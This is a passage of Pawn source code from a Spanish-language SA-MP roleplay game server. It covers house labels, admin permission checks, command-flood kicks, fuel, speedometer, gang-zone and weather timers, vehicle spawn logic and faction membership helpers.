			format(LabelStr,sizeof(LabelStr),"Casa "#CROJO"'%s'\n\n"#CBLANCO"Pertenece a "#CVERDE"%s\n"#CBLANCO"Dirección: "#CVERDE"%s\n"#CBLANCO"Puerta: "#CVERDE"Abierta",
			InfoCasa[c][cNombre],InfoCasa[c][cComprador], str_direction);
		}
	}
	else
	{
		format(LabelStr,sizeof(LabelStr),""#CROJO"< Casa en venta >\n\n"#CBLANCO"Precio: "#CVERDE"$%d "#CBLANCO"| Usa: "#CINFO"/comprar casa\n"#CBLANCO"Dirección: "#CVERDE"%s",InfoCasa[c][cPrecio], str_direction);
	}
 	strins(LabelStr,MSG_TECLAENTRAR,strlen(LabelStr));

	if(Crear)
	{
		Casa[c] = CreateDynamic3DTextLabel(LabelStr,C_BLANCO,InfoCasa[c][cEntrada_x],InfoCasa[c][cEntrada_y],InfoCasa[c][cEntrada_z]+1,8);
	}
	else
	{
		UpdateDynamic3DTextLabelText(Casa[c], C_BLANCO, LabelStr);
	}
	return 1;
}

// strmatch
stock strmatch(const String1[], const String2[])
{
	if ((strcmp(String1, String2, true, strlen(String2)) == 0) && (strlen(String2) == strlen(String1)))
	{
		return true;
	}
	else
	{
		return false;
	}
}

CALLBACK: ActualizarCuentas()
{
	foreach(Player,i)
	{
 		if(GetPVarInt(i,"Logueado"))
	    {
			ActualizarCuenta(i);
		}
	}
	return 1;
}

stock Staff(playerid, nivel)
{
	if(InfoJugador[playerid][jAdmin] < nivel)
	{
		switch(nivel)
		{
			case Destacado: 		Error(playerid,"Este comando, está autorizado para: Usuario Destacado o más.");
			case Ayudante: 			Error(playerid,"Este comando, está autorizado para: Ayudante o más.");
			case Colaborador: 		Error(playerid,"Este comando, está autorizado para: Colaborador o más.");
			case Moderador: 		Error(playerid,"Este comando, está autorizado para: Moderador o más.");
			case Mod.Superior: 		Error(playerid,"Este comando, está autorizado para: Administrador o más.");
			case Administrador: 	Error(playerid,"Este comando, está autorizado para: Administrador superior o más.");
			case AdministradorSup: 	Error(playerid,"Este comando, está autorizado para: Administrador general o más.");
			case SubDueno: 			Error(playerid,"Este comando, está autorizado para: Administrador encargado o más.");
			case Dueno: 			Error(playerid,"Este comando, está autorizado para: Dueños.");
		}
		return 1;
	}
	return 0;//success.
}

stock MensajeAdmin(color,const mensaje[],nivel)
{
	foreach(Player, i)
		if (InfoJugador[i][jAdmin] >= nivel)
			SendClientMessage(i, color, mensaje);

	return 1;
}

public OnPlayerCommandReceived(playerid, cmdtext[])
{
	if(!GetPVarInt(playerid,"Logueado")) return 0;

	#if CMD_LOG == true
	printf("[CMD] %s: %s",pName(playerid),cmdtext);
	#endif

	#if !defined VERSION_03x
	if((GetPVarInt(playerid,"EligiendoRopa") == 1 || GetPVarInt(playerid,"ElijiendoAccesorios"))&& strcmp(cmdtext,"/volver",true))
	{
		Mensaje(playerid,-1,"Recuerda que no puedes usar comandos en el ropero.");
		Mensaje(playerid,-1,"Si estás bugueado, y no puedes clickear los textos, usa "#CINFO"/volver");
		return 0;
	}
	#endif

	return 1;
}
public OnPlayerCommandPerformed(playerid, cmdtext[], success)
{
	static
	    UltimoCMD[MAX_PLAYERS],
		CuentaCMD[MAX_PLAYERS];

	new
	    tick = GetTickCount();

	if(tick - UltimoCMD[playerid] < 4000)
	{
		CuentaCMD[playerid] ++;
	 	if(CuentaCMD[playerid] > 5)
	 	{
	    	_Kick(playerid,T_ANTICHEAT,"Command Flood");
	    	Kick(playerid);
	    	CuentaCMD[playerid] = 0;
		}
	    return 1;
	}

	UltimoCMD[playerid] = tick;
	CuentaCMD[playerid] = 0;

	if(!success)
		Error(playerid,"El comando escrito, es incorrecto.");

 	return 1;
}

timer NecesitaDroga[60000 * 40]()
{
	foreach(Player,i)
	{
	    if(InfoJugador[i][jDrogado] > 5)
	    {
	        new Float:Vida;
	        GetPlayerHealth(i,Vida);
	        if((Vida - 5) < 5) SetPlayerHealth(i,3);
	        else SetPlayerHealth(i,Vida-5);
	        AutoRol(i,"siente necesidad de drogas");
 		}
	}
	return 1;
}

timer ComprobarCrack[3000]()
{
	foreach(Player,i)
	{
	    if(!GetPVarInt(i, "Logueado")) continue;
	    if(InfoJugador[i][jMuerto])
	    {
			if(GetPlayerAnimationIndex(i) != 1701)
			{
				ApplyAnimation(i, "WUZI", "CS_Dead_Guy", 4.0, 0, 0, 0, 1, 0);
			}
	    }
	    else
	    {
		    new
		        Float: Vida,
				Float: Vida_por_recuperar = GetPVarFloat(i, "VIDA_PERDIDA");

			GetPlayerHealth(i, Vida);
			if(Vida < Vida_por_recuperar)
			{
				SetPlayerHealth(i, Vida+3.0);
			}
		}
	}
	return 1;
}

timer BajaSaldo[8000]()
{
	foreach(Player,playerid)
	{
	    if(!GetPVarInt(playerid, "Logueado")) continue;
	    if(!GetPVarInt(playerid,"NUM_MELLAMA") && GetPVarInt(playerid,"EN_LLAMADA"))
	    {
			GameTextForPlayer(playerid, "~b~-1 saldo", 3000, 1);
			PlayerPlaySound(playerid, 1084, 0.0, 0.0, 0.0);
	        InfoJugador[playerid][jSaldo] --;
  	        if(!InfoJugador[playerid][jSaldo])
	        {
	            cmd_colgar(playerid,"");
				GameTextForPlayer(playerid, "~r~sin saldo", 3000, 1);
			}
		}
	}
	return 1;
}

timer BajaGasolina[30000]()
{
	foreach(Player,i)
	{
	    if(!GetPVarInt(i, "Logueado")) continue;
 		if(GetPlayerState(i) == PLAYER_STATE_DRIVER)
   		{
    		new VehID = GetPlayerVehicleID(i);
    		if(GetVehType(VehID) == VEHICLE_TYPE_BICYCLE) continue;
      		if(VGas[VehID] && !GetPVarInt(i,"CargandoComb"))
        	{
         		if(Veh[VehID][vMotor])
           		{
					VGas[VehID] --;
     			}
      		}
        	else if(!GetPVarInt(i,"CargandoComb") && !VGas[VehID] )
         	{
          		ApagarMotor(VehID);
            	TextoJugador(i,"~r~atencion~n~~n~~n~~w~Nivel de combustible nulo",6000,3);
				cmd_do(i,"Vehículo sín combustible");
	        }
		}
	}
	return 1;
}

timer ActualizarVelocimetro[600]()
{
	new Str[20];
	foreach(Player, i)
	{
	    if(!GetPVarInt(i, "Logueado")) continue;
	    if(IsPlayerInAnyVehicle(i))
	    {
	        new
				VehID = GetPlayerVehicleID(i);

			if(GetVehType(VehID) == VEHICLE_TYPE_BICYCLE) continue;
			
	        if(Veh[VehID][vMotor] == true)
	        {
				if(!GetPVarInt(i,"MOSTRO_VELOCIMETRO"))
				{
	 				MostrarVelocimetro(i);
	 				if(VehVenta_ID(VehID))
			 		{
					 	PlayerTextDrawShow(i,TDContadorKM[i]);
					}
				}
				
				new
					Float:VidaVeh;
					
				GetVehicleHealth(VehID,VidaVeh);
				
				if(GetProgressBarValue(BCombustible[i]) != VGas[VehID])
				{
					SetProgressBarValue(BCombustible[i],VGas[VehID]);
					UpdateProgressBar(BCombustible[i],i);
				}
				if(GetProgressBarValue(BEstadoVeh[i]) != VidaVeh)
				{
					SetProgressBarValue(BEstadoVeh[i],VidaVeh);
					UpdateProgressBar(BEstadoVeh[i],i);
				}
				
				new
				    stateplayer = GetPlayerState(i);

				if(VidaVeh < 420.0)
				{
					SetVehicleHealth(VehID,420.0);
					ApagarMotor(VehID);
					
					if(stateplayer == PLAYER_STATE_DRIVER)
						cmd_ame(i, "se le apagó el motor del vehículo");
						
					TextoJugador(i, "~w~motor ~r~destruido", 5000, 3);
				}

				VidaVeh = GetVehicleSpeed(VehID);
				ActualizarVelocidad(i, VidaVeh);

				if(VehVenta_ID(VehID) && stateplayer == PLAYER_STATE_DRIVER)
				{
					new
						Float:Distancia = GetPlayerDistanceFromPoint(i,
								GetPVarFloat(i,"POSVIEJA_X"),
								GetPVarFloat(i,"POSVIEJA_Y"),
								GetPVarFloat(i,"POSVIEJA_Z"));

					new
						Float:PosVieja[3];
						
					GetPlayerPos(i,PosVieja[0],PosVieja[1],PosVieja[2]);
					
					SetPVarFloat(i,"POSVIEJA_X",PosVieja[0]);
					SetPVarFloat(i,"POSVIEJA_Y",PosVieja[1]);
					SetPVarFloat(i,"POSVIEJA_Z",PosVieja[2]);
					
					if(Distancia > 40.0) Distancia = 0;
					
					InfoVeh[VehVenta_ID(VehID)][vMetros] += Distancia;
					A_Format(Str,"%06.0f ~b~~h~~h~KM",InfoVeh[VehVenta_ID(VehID)][vMetros]/1000);
					PlayerTextDrawSetString(i,TDContadorKM[i],Str);
				}
			}
	    }
	}
	return true;
}

stock ActualizarGangZones()
{
	new
		File:GZ = fopen("GangZones.ini", io_write),
		Str[80];

	Loop(i, MAX_GZS, 0) if(IsValidGangZone(i))
	{
		A_Format(Str,"%.04f|%.04f|%.04f|%.04f|%d\r\n", InfoGZ[i][gzMin][0],InfoGZ[i][gzMin][1],InfoGZ[i][gzMax][0], InfoGZ[i][gzMax][1], InfoGZ[i][gzPandilla]);
		fwrite(GZ, Str);
	}

	fclose(GZ);
	return 1;
}

timer GangZones_Dudas[1000]()
{
	//Dudas
	foreach(Player, i)
	{
	    if(InfoJugador[i][jTiempoDudas])
	        InfoJugador[i][jTiempoDudas]--;
	}
	//GangZones
	Loop(i, sizeof InfoGZ, 0)
	{
	    if(gzAtacadaPor[i] != -1)
	    {
	        gzTiempo[i] ++;
	        if(gzTiempo[i] >= TIEMPO_GUERRA_GZ)
	        {
	            new
					bool:success;

	            if(PandillerosEnGangZone(gzAtacadaPor[i], i))
	            {
			        Loop(f, sizeof InfoFamilia, 0) if(InfoFamilia[f][fPandilla])
			        {
			            if(PandillerosEnGangZone(gzAtacadaPor[i], i) < PandillerosEnGangZone(f, i))
			            {
			                gzAtacadaPor[i] = f;
						}
						foreach(Player,playerid)
						{
						    RemovePlayerMapIcon(playerid, MI_GANGWARS);
						}
					}
					success = true;
				}
				else
				{
				    printf("- GangZone ID %d volvio a su viejo estado, porque no habian atacantes");
					success = false;
				}

				if(!success)
				{
		            gzTiempo[i] = 0;
					gzAtacadaPor[i] = -1;
					GangZoneStopFlashForAll( InfoGZ[i][gzID] );
					continue;
				}

				GangZoneStopFlashForAll(InfoGZ[i][gzID]);
				GangZoneHideForAll(InfoGZ[i][gzID]);
				GangZoneShowForAll(InfoGZ[i][gzID], ColoresGZ[gzAtacadaPor[i]]);
				InfoGZ[i][gzPandilla] = gzAtacadaPor[i];
	            gzTiempo[i] = 0;
				gzAtacadaPor[i] = -1;
				ActualizarGangZones();
			}
		}
	}
	return 1;
}


CALLBACK: ActualizarVelocidad(playerid, Float:Velocidad)
{
	new SS[18];
	format(SS,18,"~b~~h~~h~%.0f",Velocidad);
	PlayerTextDrawSetString(playerid,VelocidadV[playerid], SS);
	return 1;
}

stock Rand(min,max)
{
    new TotalAm = min+(max/min)+random(max-min);
    if(TotalAm > max) TotalAm = max;
    if(TotalAm < min) TotalAm = min;
	return TotalAm;
}

stock GetVehType(vehicleid)
{
	new
	    VehModel = GetVehicleModel(vehicleid);

	if( 400 <= VehModel <= 611 )
	{
		switch(VehModel)
		{
		    case 417, 425, 447, 460, 469, 476, 487, 488, 497, 511, 512, 513, 519, 520, 548, 553, 563, 577, 592, 593:
		    {
		        return VEHICLE_TYPE_AIRCRAFT;
			}
			case 481, 509, 510:
			{
			    return VEHICLE_TYPE_BICYCLE;
			}
			case 448, 461, 462, 463, 468, 471, 521, 522, 523, 581, 586:
			{
			    return VEHICLE_TYPE_BIKE;
			}
			case 430, 446, 452, 453, 454, 472, 473, 484, 493, 595:
			{
			    return VEHICLE_TYPE_BOAT;
			}
			case 449, 537, 538, 569, 570, 590:
			{
			    return VEHICLE_TYPE_TRAIN;
			}
			case 441, 465, 501, 564, 594:
			{
			    return VEHICLE_TYPE_OTHER;
			}
			default:
			{
			    return VEHICLE_TYPE_CAR;
			}
		}
	}
	return VEHICLE_TYPE_UNKNOWN;
}


stock EstaEnEstacionServicio(playerid)
{
	for(new i; i < sizeof (EstacionServicio); i++)
	    if(IsPlayerInRangeOfPoint(playerid, 15.0, EstacionServicio[i][0], EstacionServicio[i][1], EstacionServicio[i][2]))
	        return true;

    return false;
}

stock CargarGasolina_P(playerid, litros = -1)
{
	if(litros == -1)
	{
		SetPVarInt(playerid, "Litros_por_cargar", 100);
	}
	else
	{
		SetPVarInt(playerid, "Litros_por_cargar", VGas[GetPlayerVehicleID(playerid)]+litros);
	}

	KillTimer2(playerid, TIMER_CARGANDOCOMB);
	Timer_Jugador[playerid][TIMER_CARGANDOCOMB] = SetTimerEx("CargarCombustible", 1000, true, "i", playerid);
	AutoRol(playerid, "comienza a llenar el tanque de su vehículo");
	SetPVarInt(playerid, "CargandoComb", 1);
	return 1;
}

CALLBACK: CargarCombustible(playerid)
{
	new VehID = GetPlayerVehicleID(playerid);
	if(VGas[VehID] < GetPVarInt(playerid, "Litros_por_cargar"))
	{
		if(GetPlayerMoney(playerid) < 3)
		{
			Mensaje(playerid,C_NEGATIVO,"No tienes suficiente dinero para cargar el tanque.");
   			TogglePlayerControllable(playerid,true);
   			KillTimer2(playerid,TIMER_CARGANDOCOMB);
			DeletePVar(playerid,"CargandoComb");
			DeletePVar(playerid,"Litros_por_cargar");
			return 1;
		}
		else
		{
			VGas[VehID] += 1;
			QuitarDinero(playerid,3);
			new string[60];
   			format(string, sizeof(string),"~n~~n~~n~~g~~h~Combustible: ~w~%d%%",VGas[VehID]);
			SetProgressBarValue(BCombustible[playerid],VGas[VehID]);
			UpdateProgressBar(BCombustible[playerid],playerid);
 			TextoJugador(playerid,string,1500,3);
			return 1;
		}
	}
	else
	{
		TogglePlayerControllable(playerid,true);
		KillTimer2(playerid,TIMER_CARGANDOCOMB);
		DeletePVar(playerid,"CargandoComb");
		DeletePVar(playerid,"Litros_por_cargar");
		return 1;
	}
}

public OnVehicleSpawn(vehicleid)
{
	ApagarMotor(vehicleid);

	SetVehicleHealth(vehicleid, 1000.0);

	if(Veh[vehicleid][vTrabajo])
	{
	    VGas[vehicleid] = 100;
	    AbrirPuertas(vehicleid);
	}
	    
	if(Veh[vehicleid][vCerrado] && vehicleid > MAX_VEH_RENTA)
		SetTimerEx("CerrarPuertas",50,false,"i",vehicleid);

	if(EsVehRenta(vehicleid))
	{
	    VGas[vehicleid] = 100;
		if(VehRentado[vehicleid])
		{
			foreach(Player,i)
  			{
	    	    if(GetPVarInt(i,"RentoVehID") == vehicleid)
	    	    {
	    	        DeletePVar(i,"RentoVehID");
	    	        Mensaje(i,-1,"El vehículo que habias rentado, fue devuelto.");
				}
			}
		}
		VehRentado[vehicleid] = 0;
		return 1;
	}
	if(VehVenta_ID(vehicleid))
	{
	    new
			i = VehVenta_ID(vehicleid);

	    SetVehiclePos(vehicleid, -9999.9, -9999.9, -9999.9);

		if(Bit_Get(VehiculoDestruido, i))
		{
	    	SetTimerEx("ReturnVehicleDataPos", (1000*60)*30, false, "ii", vehicleid, i);
			Bit_Set(VehiculoDestruido, i, false);
		}
		else
		{
	    	SetTimerEx("ReturnVehicleDataPos", 3000, false, "ii", vehicleid, i);
		}

		ID_VehOriginal[i] = vehicleid;

        SetVehicleNumberPlate(vehicleid, InfoVeh[i][vPlaca]);
        ChangeVehiclePaintjob(vehicleid, InfoVeh[i][vPintadoJ]);
		SetVehicleVirtualWorld(vehicleid, InfoVeh[i][vVW]);
		LinkVehicleToInterior(vehicleid,InfoVeh[i][vInt]);

  		Loop(m, MAX_VEH_MODS,0)
		{
		    if(vMods[i][m])
		    {
		        if(!islegalcarmod(GetVehicleModel(vehicleid),vMods[i][m]))
		        {
		            vMods[i][m] = 0;
				}
		        else AddVehicleComponent(vehicleid, vMods[i][m]);
			}
		}
		return 1;
	}
	else if(EsCamion(vehicleid))
	{
	    foreach(Player,i)
	    {
	        if(EsCamionero(i))
	        {
	            if(GetPVarInt(i,"Chofer_Camion") == vehicleid)
	            {
	                Error(i,"Fallaste tu misión de camionero, perdiste el camión.");
					DeletePVar(i,"Chofer_Camion");
					DeletePVar(i,"NivelCamionero");
					DeletePVar(i,"PasoEntrega");
				}
			}
		}
		ClearString(InfoCamion[vehicleid][camChofer]);
		InfoCamion[vehicleid][camCarga] = 0;
		return 1;
	}
	else if(EsCosechadora(vehicleid))
	{
	    foreach(Player,i)
	    {
	        if(EsCosechador(i))
	        {
	            if(GetPVarInt(i,"EstaCultivando") == vehicleid)
				{
				    Error(i,"¡Fallaste tu trabajo de cosechador!");
				    DeletePVar(i,"EstaCultivando");
				    DeletePVar(i,"ParteCosecha");
					HideProgressBarForPlayer(i,BCosecha[i]);
					DisablePlayerRaceCheckpoint(i);
				}
			}
		}
	}

	foreach(Player,i)
	{
		if(GetPVarInt(i,"CAMION_BASURA") == vehicleid)
		{
			DeletePVar(i,"TerminoBasura");
			DeletePVar(i,"CAMION_BASURA");
			DeletePVar(i,"B_ParteLimpieza");
			HideProgressBarForPlayer(i,BCosecha[i]);
			return 1;
		}
	}

	Loop(i, 20, 0)
	{
	    if(VehPrueba[i] != INVALID_VEHICLE_ID)
	    {
		    if(VehPrueba[i] == vehicleid)
		    {
	        	DestroyVehicle(vehicleid);
				VehPrueba[i] = INVALID_VEHICLE_ID;
				foreach(Player,p)
				{
					if(GetPVarInt(p, "ESTADIO_VEHID") == vehicleid)
					{
						DeletePVar(p, "ESTADIO_VEHID");
						break;
					}
				}
	            break;
			}
		}
	}

 	Loop(i,3,0)
  	{
		if(vehicleid == LicenciaMoto[i])
		{
		    LinkVehicleToInterior(vehicleid,1);
		    SetVehicleVirtualWorld(vehicleid,2);
	    	VGas[vehicleid] = 100;
		}
		else if(vehicleid == LicenciaAuto[i])
		{
		    LinkVehicleToInterior(vehicleid,1);
	    	VGas[vehicleid] = 100;
		    SetVehicleVirtualWorld(vehicleid,1);
		}
	}
	return 1;
}

CALLBACK: ReturnVehicleDataPos(vehicleid, i)
{
	SetVehicleZAngle(vehicleid, InfoVeh[i][vPosA]);
	SetVehiclePos(vehicleid, InfoVeh[i][vPosX],InfoVeh[i][vPosY],InfoVeh[i][vPosZ]);

	ChangeVehicleColor(vehicleid, InfoVeh[i][vColor1], InfoVeh[i][vColor2]);
	return 1;
}

#define BYTES_PER_CELL              4

stock MensajeF(playerid, color, fstring[], {Float, _}:...)
{
	/*
	Y_Less  &|   Zeex
	*/
    static const STATIC_ARGS = 3;
    new n = (numargs() - STATIC_ARGS) * BYTES_PER_CELL;
    if(n)
    {
        new message[144],arg_start,arg_end;
        #emit CONST.alt        fstring
        #emit LCTRL          5
        #emit ADD
        #emit STOR.S.pri        arg_start

        #emit LOAD.S.alt        n
        #emit ADD
        #emit STOR.S.pri        arg_end
        do
        {
            #emit LOAD.I
            #emit PUSH.pri
            arg_end -= BYTES_PER_CELL;
            #emit LOAD.S.pri      arg_end
        }
        while(arg_end > arg_start);

        #emit PUSH.S          fstring
        #emit PUSH.C          144
        #emit PUSH.ADR         message

        n += BYTES_PER_CELL * 3;
        #emit PUSH.S          n
        #emit SYSREQ.C         format

        n += BYTES_PER_CELL;
        #emit LCTRL          4
        #emit LOAD.S.alt        n
        #emit ADD
        #emit SCTRL          4

        if(playerid == INVALID_PLAYER_ID)
        {
            #pragma unused playerid
            return SendClientMessageToAll(color, message);
        } else {
            return SendClientMessage(playerid, color, message);
        }
    } else {
        if(playerid == INVALID_PLAYER_ID)
        {
            #pragma unused playerid
            return SendClientMessageToAll(color, fstring);
        } else {
            return SendClientMessage(playerid, color, fstring);
        }
    }
}

// ----==== [ Miembros/Lideres Facciones ] ===--- //

stock EsLSPD(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    if(InfoJugador[playerid][jMiembro] | InfoJugador[playerid][jLider] == IDLSPD)
		{
		    return 1;
		}
	}
	return 0;
}

stock EsMilitar(playerid)
{
	if(InfoJugador[playerid][jMiembro] | InfoJugador[playerid][jLider] == IDLSEM)
	{
  		return 1;
	}
	return 0;
}

stock EsMedico(playerid)
{
	if(InfoJugador[playerid][jMiembro] | InfoJugador[playerid][jLider] == IDLSMD)
	{
 		return 1;
	}
	return 0;
}

stock EsReportero(playerid)
{
	if(InfoJugador[playerid][jMiembro] | InfoJugador[playerid][jLider] == IDLSTV)
	{
 		return 1;
	}
	return 0;
}

stock EsMecanico(playerid)
{
	if(InfoJugador[playerid][jMiembro] | InfoJugador[playerid][jLider] == IDMECANICOS)
	{
 		return 1;
	}
	return 0;
}

stock EsDelGobierno(playerid)
{
	if(InfoJugador[playerid][jMiembro] | InfoJugador[playerid][jLider] == IDGOBIERNO)
	{
 		return 1;
	}
	return 0;
}

stock EsPresidente(playerid)
{
	if(InfoJugador[playerid][jLider] == IDGOBIERNO)
	{
 		return 1;
	}
	return 0;
}

stock EsCamionero(playerid)
{
	if(InfoJugador[playerid][jTrabajo] == ID_Camionero) return 1;
	return 0;
}

stock EsCosechador(playerid)
{
	if(InfoJugador[playerid][jTrabajo] == ID_Cosechador) return 1;
	return 0;
}

stock EsBasurero(playerid)
{
	if(InfoJugador[playerid][jTrabajo] == ID_Basurero) return 1;
	return 0;
}

stock EsLadron(playerid)
{
	if(InfoJugador[playerid][jTrabajo] == ID_Ladron) return 1;
	return 0;
}

stock EsHitman(playerid)
{
	if(InfoJugador[playerid][jMiembro] | InfoJugador[playerid][jLider] == IDHITMAN)
	{
 		return 1;
	}
	return 0;
}

// ------====[ Vehiculos Facciones y otros ]=========------- //

stock VehCercaMio(playerid)
{
	new Float:PosVeh[3];
	foreach(Vehicle,i)
	{
	    if(i == GetPlayerVehicleID(playerid)) continue;
		GetVehiclePos(i,PosVeh[0],PosVeh[1],PosVeh[2]);
		if(IsPlayerInRangeOfPoint(playerid,10,PosVeh[0],PosVeh[1],PosVeh[2])) return i;
	}
	return -1;
}

stock EsVehRenta(vehid)
	return (vehid >= MIN_VEH_RENTA && vehid <= MAX_VEH_RENTA);

stock EsVehLSPD(vehid)
	return (Veh[vehid][vFaccion] == IDLSPD);

stock EsVehLSEM(vehid)
	return (Veh[vehid][vFaccion] == IDLSEM);

stock EsVehLSMD(vehid)
	return (Veh[vehid][vFaccion] == IDLSMD);

stock EsCamion(vehid)
	return (Veh[vehid][vTrabajo] == ID_Camionero);

stock EsTaxi(vehid)
	return (Veh[vehid][vTrabajo] == ID_Taxista);

stock EsCosechadora(vehid)
	return (Veh[vehid][vTrabajo] == ID_Cosechador);

stock EsVehLSTV(vehid)
	return (Veh[vehid][vFaccion] == IDLSTV);

stock EsVehMecanicos(vehid)
	return (Veh[vehid][vFaccion] == IDMECANICOS);

stock EsBiciRepartidora(vehid)
	return (Veh[vehid][vTrabajo] == ID_RepartidorB);

stock EsVehBasurero(vehid)
	return (Veh[vehid][vTrabajo] == ID_Basurero);

stock EsVehGob(vehid)
	return (Veh[vehid][vFaccion] == IDGOBIERNO);

stock EsVehHIT(vehid)
	return (Veh[vehid][vFaccion] == IDHITMAN);

// -----------==============[ Nombre faccion ]============--------- //

stock NombreFaccion(idfaccion)
{
	new NFaccion[11];
	switch(idfaccion)
	{
		case IDLSPD: 		NFaccion = "Policia";
		case IDLSEM: 		NFaccion = "Ejército";
		case IDLSMD: 		NFaccion = "Hospital";
		case IDLSTV: 		NFaccion = "Televisión";
		case IDMECANICOS:	NFaccion = "Mecánicos";
		case IDGOBIERNO: 	NFaccion = "Gobierno";
		case IDHITMAN:      NFaccion = "Hitman";
	}
	return NFaccion;
}

stock NombreCarga(carga)
{
	new cargan[18];
	switch(carga)
	{
	    case 0: cargan = "Nada";
	    case CAR_ROPA: cargan = "Ropa";
	    case CAR_PRODUCTOS: cargan = "Productos varios";
	    case CAR_COMIDA: cargan = "Comida y bebida";
	    case 435: cargan = "Comida";
	    case 450: cargan = "Tierra";
	    case 591: cargan = "Granos";
	}
	return cargan;
}

// -----------==============[ Otras funciones ]============--------- //

timer ActualizarHora[1000 * 60]()
{
    gettime(Hora, Minuto);

   	SetWorldTime(Hora);

	new Str[20];
	A_Format(Str,"~b~~h~~h~%02d:%02d",Hora,Minuto);
	foreach(Player,x)
	{
	    if( LuzCortada == true )
		{
		    if( GetPVarInt(x,"EN_BANCO") )
		    {
		        SetPlayerTime(x, 24, 0);
				continue;
			}
		}
 		SetPlayerTime(x,Hora,Minuto);
  		TextDrawSetString(HoraB,Str);
	}

	switch(Hora)
	{
	    case 0, 2, 4, 6, 8, 10, 12, 14, 16, 18, 20, 22, 24:
		{
		    if(Minuto == 0)
		    {
				AnuncioGobernamental("Ya se comenzaron a entregar los subsidios, porfavor presentarse en el banco entre los próximos 40 minutos.");
				Loop(i, MAX_CUENTAS_BANCARIAS, 0)
				{
				    Bit_Set(CB_RecibioPaga, i, false);
				}
			}
		}
	}
	return 1;
}

stock IsPayTime()
{
	gettime(Hora, Minuto);

	if(0 <= Minuto <= 40)
	{
		switch(Hora)
		{
		    case 0, 2, 4, 6, 8, 10, 12, 14, 16, 18, 20, 22, 24:
		    {
		        return 1;
			}
		}
	}
	return 0;
}




stock CrearCamilla(Float:x, Float:y, Float:z, Float:rz)
{
	static
	    i;

	i++;

	InfoCamilla[i][camiObjID] = CreateObject(2146, x, y, z, 0.0, 0.0, rz);
	InfoCamilla[i][camiUsadaPor] = INVALID_PLAYER_ID;
	return 1;
}

CALLBACK: ActualizarCamilla(playerid, objid)
{
	new
	    Float:Pos[3],
		Float:Ang,
		Float:SPD,
		Float:vx,
		Float:vy,
		Float:vz,
		Float:Speed = 3.5,
		Float:Distance = 1.7
	;


	GetPlayerFacingAngle(playerid, Ang);
	GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
	GetPlayerVelocity(playerid, vx,vy,vz);

	SPD = floatsqroot(((vx*vx)+(vy*vy))+(vz*vz))*100;

	if(GetPlayerAnimationIndex(playerid) == 1231)
	{
		if(SPD < 3.99)
		{
		    Distance = 2.2;
		    Speed = 2.0;
		}
		else
		{
		    Distance = 3.0;
		    Speed = 5.0;
		}
	}

	new
	    Float:ObjPos[3];

	GetObjectPos(objid, ObjPos[0], ObjPos[1], ObjPos[2]);

	if(GetPlayerDistanceFromPoint(playerid, ObjPos[0], ObjPos[1], ObjPos[2]) > 30.0)
	{
		Speed = 99999.9;
	    foreach(Player,i)
	    {
		    if(GetPlayerSurfingObjectID(i) == objid)
		    {
		        SetPlayerPos(i, ObjPos[0], ObjPos[1], ObjPos[2]+0.5);
		        SetPlayerInterior(i, GetPlayerInterior(playerid));
		        SetPlayerVirtualWorld(i, GetPlayerVirtualWorld(playerid));
		        cmd_crack(i, "");
			}
		}
	}

	GetObjectRot(objid,  ObjPos[0], ObjPos[1], ObjPos[2]);

	#define ROT_FOR_DETTACH     120.0

	if( (Ang - ROT_FOR_DETTACH > ObjPos[2]) || (Ang + ROT_FOR_DETTACH < ObjPos[2]) || GetPlayerSurfingObjectID(playerid) == objid)
	{
		Loop(i, sizeof(Camillas), 0)
		{
			if(InfoCamilla[i][camiObjID] == objid)
			{
			    new
			        Float:Pos_[4];

				GetPlayerFacingAngle(playerid, Pos_[3]);
				GetPlayerPos(playerid, Pos_[0], Pos_[1], Pos_[2]);
				GetPosInFrontOfPlayer(playerid, Pos_[0], Pos_[1], 2.0);

			    InfoCamilla[i][camiUsadaPor] = INVALID_PLAYER_ID;
			    Camillas[i][0] = Pos_[0];
			    Camillas[i][1] = Pos_[1];
			    Camillas[i][2] = Pos_[2];
			    Camillas[i][3] = Pos_[3];
		        KillTimer2(playerid, TIMER_CAMILLA);
                SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
		        return 1;
			}
		}
	}

	GetPosInFrontOfPlayer(playerid, Pos[0], Pos[1], Distance);
	MoveObject(objid, Pos[0], Pos[1], Pos[2]-0.5, Speed, 0, 0, Ang);

	return 1;
}


timer ChequearVida[8000]()
{
	foreach(Player,i)
	{
	    if(!GetPVarInt(i,"CargoCuenta")) continue;
        new
			Float:Vida;

        GetPlayerHealth(i,Vida);

        if(Vida < 20.0)
        {
            if(GetPVarInt(i,"Efecto_ibupirac"))
            {
                SetPVarInt(i, "Efecto_ibupirac", GetPVarInt(i,"Efecto_ibupirac") -1);
			}
			else
			{
			    if(!GetPlayerDrunkLevel(i))
			    {
					SetPlayerDrunkLevel(i,5000);
				}
			}
		}
	}
	return 1;
}

stock _TD(text[])
{
	new
		TextoES[130];

    Loop(i,strlen(text),0)
    {
        switch(text[i])
        {
            case 'Á', 'á': TextoES[i] = '˜';
            case 'É', 'é': TextoES[i] = 'ž';
            case 'Í', 'í': TextoES[i] = '¢';
            case 'Ó', 'ó': TextoES[i] = '¦';
            case 'Ú', 'ú': TextoES[i] = 'ª';
            case 'Ñ', 'ñ': TextoES[i] = '®';
            case '¿': TextoES[i] = '¯';
            case '¡': TextoES[i] = '^';
            default: TextoES[i] = text[i];
        }
    }
    return TextoES;
}

timer ClimaAleatorio[60000 * 30]()
{
	new
		NombreClima[60],
		rand = random(15),
		clima;

	switch(rand)
	{
		case 0:
		{
			NombreClima = "con algo de viento";
			clima = 4;
		}
		case 1:
		{
			NombreClima = "con tormenta, fuertes lluvias";
			clima = 8;
		}
 		default:
   		{
			NombreClima = "despejado";
			clima = 17;
		}
	}
	MensajeTodosF(C_AZUL2,"(LSTV) Vamos con el pronostico: "#CBLANCO"Se espera un clima %s",NombreClima);
	SetTimerEx("CambiarClima",10000,false,"i",clima);
	return 1;
}

CALLBACK: CambiarClima(i) return SetWeather(i);

stock VerNombreContacto(playerid,idcontacto)
{
	new Str[16],Contact[20];
	A_Format(Str,"CEL_NombreC_%d",idcontacto);
	GetPVarString(playerid,Str,Contact,20);
	return Contact;
}


stock CambiarNombreContacto(playerid,idcontacto,contacto[])
{
	new Str[16];
	A_Format(Str,"CEL_NombreC_%d",idcontacto);
	SetPVarString(playerid,Str,contacto);
	return true;
}

stock AgregarContacto(playerid, index, num, name[])
{
	if(0 <= index <= 10)
	{
	    new
			INI:Arch = INI_Open(U_Usuario(playerid)),
			Str[15];
			
